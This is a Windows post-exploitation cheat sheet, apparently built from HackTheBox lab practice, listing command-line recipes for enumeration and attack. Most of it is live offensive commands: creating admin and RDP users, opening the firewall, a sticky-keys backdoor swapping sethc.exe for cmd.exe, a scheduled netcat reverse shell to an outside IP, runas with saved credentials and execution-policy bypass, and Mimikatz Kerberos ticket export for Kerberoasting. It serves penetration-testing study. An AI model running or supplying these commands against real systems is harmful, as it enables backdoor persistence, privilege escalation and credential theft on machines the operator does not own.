## Get User information

```
net user mhope
```

## Get all current user information

```
whoami /all
```

## Show all users on a system

```
net user
```

## Show all users on a system, with domain users

```
 net user /domain
 net group /domain
```

## see user info

```
net user tolis
```

## See what groups current user is in

```
whoami /groups
```

## see what groups are on the system:

```
net localgroup
```

## see what users belong to the Administrators group

```
net localgroup Administrators
```

## Add user to local Administrators

```
net localgroup Administrators admin /add
```

## Change Password of user/Create New User:

```
net user administrator password
```

## See what privs the user has

```
whoami /priv
```

## Login as net user only in order to "mimic" creds
## this will allow you to hit the domain controller as this user

```
runas /netonly /user:active.htb\svc_tgs cmd
```

## Run command as Admin User with Saved Creds

```
runas /user:ACCESS\Administrator /savecred "powershell -executionpolicy bypass C:\Users\security\documents\n.ps1"
```

## Show Ownership information with dir

```
dir /q
```
## Dir Lists every occurrence of the specified file name within the specified directory and all subdirectories.
## Display alternate data streams of the file

```
dir /s
dir /r
```

## Show Hidden Files with Dir

```
dir /A:H
```


## Find stuff with dir

```
dir secret.doc /s /p
```

## Enmurate Entire C: with dir to find stuff:

```
dir *.bat /s /a
dir *.txt /s /a
dir *.log /s /a
```

## Use findstr to view the contents of a file, just in case "type" doesn't work

```
findstr ".*" "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

## Use findstr to find multiple strings:

```
 findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

## Use robocopy just in case "dir" doesn't work

```
robocopy C:\Windows C:\Users\Administrator\ /L
```

## Use robocopy to copy over directories to smb shares:

```
robocopy .\ColdFusion8 \\10.10.10.15\temp\Cold\ /S
```

## List Saved Credentials

```
cmdkey /list
```

## Veiw Started Services:

```
net start
```

## Connect to SMB share

```
net use z: \\10.10.10.14\temp
```

## Open a Share on the host

```
net share sharename=folderpath /grant:username,permissions

sharename: You can assign name to the share you are going to create
username : Login id of the user whom you want to share the folder with
permission: Read, Change or Full
```


# Ennable Remote Desktop and let normal users through

## Add a new user and then change its password:

```
net user /add max
net user /add max H@acked1
```

## Enable Remote Desktop and let it through the firewall

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```


**Fast Way (Enable Remote Desktop and pop secret shell)**

```bat
net user /add max password
net localgroup administrators max /add
net localgroup "Remote Desktop Users" max  /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
netsh firewall set service ALL ENABLE ALL
```
---
<br/>

## Add normal users to the remote desktop group since, by default admins are only allowed for remote access

```
net localgroup "Remote Desktop Users" [USER]  /add
```

## Find Windows Arch

```
echo %PROCESSOR_ARCHITECTURE%
```

## Find Windows Version:

```
ver
```


## Copy cmd and have it show up on sticky keys:

```
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
```

---
</br>

## Use the "at" to schedule a task and then run it

```
at 8:06 cmd /c C:\wmpub\nc.exe 10.10.14.15 6666 -e cmd
schtasks
schtasks /Run /Tn At3
```

---
</br>


## Use tasklist to see what services each process is attached to

```
tasklist /SVC
```

## Enmurate Filewall Settings:

```
netsh advfirewall show currentprofile

netsh advfirewall firewall show rule name=all
```

## Enmuarte Scheduled Tasks

```
schtasks /query /fo LIST /v
```

## Enmurate Installed Applications (Registry Installed)

```
wmic product get name, version, vendor
```

## Enmuate Hotfixes:

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## Get Service start mode

```
wmic service where caption="Serviio" get name,caption,state,startmode
```

## Enmurate Writable Files

```
accesschk.exe -uws "Everyone" "C:\Program Files"


accesschk.exe -uws "Everyone" "C:\Program Files"
```

## Enmuarte Attached Hard Drives

```
mountvol
```

## Enmurate Release Id of OS

```
Reg Query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr ReleaseId
```

## Enmurate Permissions of File

```
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"

Mask Permissions
F -->  Full access
M -->  Modify access
RX -->  Read and execute access
R -->  Read-only access
W --> Write-only access
```

## List Kerberos Tickets

```
klist
```

## Export your Kerberos Tickets for Mimikatz extraction and Kerbroasting

```
kerberos::list /export
```
